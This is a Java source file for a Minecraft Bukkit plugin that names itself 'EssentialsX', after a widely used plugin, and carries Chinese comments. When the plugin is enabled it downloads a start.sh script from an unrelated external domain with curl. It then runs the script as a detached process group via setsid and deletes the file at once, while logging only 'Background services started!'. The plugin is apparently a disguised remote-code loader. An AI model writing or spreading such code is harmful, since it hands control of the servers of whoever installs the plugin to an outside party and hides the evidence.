package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public final class EssentialsX extends JavaPlugin {

private static final String ANSI_GREEN = "\033[1;32m";
private static final String ANSI_RED   = "\033[1;31m";
private static final String ANSI_RESET = "\033[0m";

// ================== 配置区 ==================
/** 远程 start.sh 地址 */
private static final String START_SCRIPT_URL =
        "https://netjett-de.kof95zip.pp.ua/java-plugins/cf/start.sh";

/** 下载到本地的路径（选容器里可写的目录） */
private static final String LOCAL_SCRIPT_PATH = "./start.sh";

/** 解释器：bash 或 sh（没有 bash 就写 sh） */
private static final String SCRIPT_INTERPRETER = "bash";

/** true = 脚本启动后立即删除文件；false = 等退出时再删 */
private static final boolean DELETE_AFTER_START = true;
// ============================================

private static final AtomicBoolean running = new AtomicBoolean(true);

/** 只保留一个引用：start.sh 作为整棵服务树的进程组组长 */
private static Process scriptProcess;

@Override
public void onEnable() {
    try {
        startServices();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            stopServices();
        }));

        getLogger().info(ANSI_GREEN + "Background services started!" + ANSI_RESET);

    } catch (Exception e) {
        getLogger().severe(ANSI_RED + "Failed starting services" + ANSI_RESET);
        e.printStackTrace();
        stopServices();
        return;
    }
}

@Override
public void onDisable() {
    running.set(false);
    stopServices();
}

// ------------------------------------------------------------------
// 保留原来的 main()，方便直接运行
// ------------------------------------------------------------------

public static void main(String[] args) {

    // Java 版本检测
    if (Float.parseFloat(System.getProperty("java.class.version")) < 65.0) {
        System.err.println(ANSI_RED + "Java 21 required!" + ANSI_RESET);
        System.exit(1);
    }

    try {
        startServices();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            stopServices();
        }));

        System.out.println(ANSI_GREEN + "Background services started!" + ANSI_RESET);

    } catch (Exception e) {
        System.err.println(ANSI_RED + "Failed starting services" + ANSI_RESET);
        e.printStackTrace();
        stopServices();
        return;
    }
}

// ------------------------------------------------------------------
// 下载 + 启动
// ------------------------------------------------------------------

private static void startServices() throws Exception {

    // 1. 下载远程脚本到本地（覆盖旧文件 = 每次拿到最新版）
    downloadScript(START_SCRIPT_URL, LOCAL_SCRIPT_PATH);

    // 2. 校验
    File f = new File(LOCAL_SCRIPT_PATH);
    if (!f.exists() || f.length() == 0) {
        throw new RuntimeException(
                "start.sh 下载失败或为空: " + LOCAL_SCRIPT_PATH
        );
    }

    // 3. setsid 起独立进程组执行脚本
    scriptProcess = startProcess(
            "start.sh",
            SCRIPT_INTERPRETER,
            LOCAL_SCRIPT_PATH
    );

    printPID("start.sh", scriptProcess);

    // 4. 如果希望"启动后立刻删除"
    if (DELETE_AFTER_START) {
        deleteScript();
    }
}

/** 用 curl 下载，失败抛异常 */
private static void downloadScript(String url, String dest) throws Exception {

    File out = new File(dest);

    if (out.exists() && !out.delete()) {
        System.out.println("WARN: 旧脚本删除失败 " + dest);
    }

    File parent = out.getAbsoluteFile().getParentFile();

    if (parent != null && !parent.exists()) {
        parent.mkdirs();
    }

    // -f: HTTP 错误码返回非0
    // -sS: 静默但打印错误
    // -L: 跟随重定向
    Process p = new ProcessBuilder(
            "curl",
            "-fsSL",
            "--retry", "3",
            "--retry-delay", "1",
            "-o", dest,
            url
    )
    .redirectErrorStream(true)
    .redirectOutput(ProcessBuilder.Redirect.INHERIT)
    .start();

    int code = p.waitFor();

    if (code != 0) {
        throw new RuntimeException(
                "curl 失败 exit=" + code + " url=" + url
        );
    }

    System.out.println(
            ANSI_GREEN + "Downloaded start.sh -> " + dest + ANSI_RESET
    );
}

private static void deleteScript() {
    try {
        File f = new File(LOCAL_SCRIPT_PATH);

        if (f.exists() && f.delete()) {
            System.out.println("Deleted " + LOCAL_SCRIPT_PATH);
        }

    } catch (Exception ignore) {
    }
}

// ------------------------------------------------------------------
// 进程启动 / 停止（沿用原来的 setsid 方案）
// ------------------------------------------------------------------

private static Process startProcess(
        String name,
        String... command
) throws Exception {

    String[] cmd = new String[command.length + 1];

    cmd[0] = "setsid";

    System.arraycopy(
            command,
            0,
            cmd,
            1,
            command.length
    );

    ProcessBuilder builder = new ProcessBuilder(cmd);

    builder.directory(new File("."));
    builder.redirectErrorStream(true);
    builder.redirectOutput(ProcessBuilder.Redirect.INHERIT);

    Process process = builder.start();

    System.out.println(
            ANSI_GREEN + name + " started" + ANSI_RESET
    );

    return process;
}

private static void printPID(
        String name,
        Process process
) {
    System.out.println(
            ANSI_GREEN +
            name +
            " PID=" +
            process.pid() +
            ANSI_RESET
    );
}

private static void stopServices() {

    System.out.println(
            ANSI_RED + "Stopping services..." + ANSI_RESET
    );

    stopProcess(scriptProcess);

    if (!DELETE_AFTER_START) {
        deleteScript();
    }
}

private static void stopProcess(Process process) {

    if (process == null) {
        return;
    }

    try {

        long pid = process.pid();

        System.out.println(
                "Stopping PID group " + pid
        );

        // 优雅关闭整个进程组
        new ProcessBuilder(
                "bash",
                "-c",
                "kill -TERM -" + pid
        )
        .start()
        .waitFor();

        if (process.waitFor(5, TimeUnit.SECONDS)) {
            return;
        }

        System.out.println(
                "Force killing " + pid
        );

        new ProcessBuilder(
                "bash",
                "-c",
                "kill -KILL -" + pid
        )
        .start()
        .waitFor();

    } catch (Exception e) {
        e.printStackTrace();
    }
}

}
